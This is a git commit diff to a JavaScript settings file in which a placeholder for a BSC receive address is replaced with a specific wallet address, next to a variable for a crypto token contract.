224012820468bfa66b0deed41d8644113e88deca
labstoneinc <107779055+labstoneinc@users.noreply.github.com>
2022-06-19 03:42:27 +0100

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x86a208Cf4D384eE68dc600A39f092E394b582f9d";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
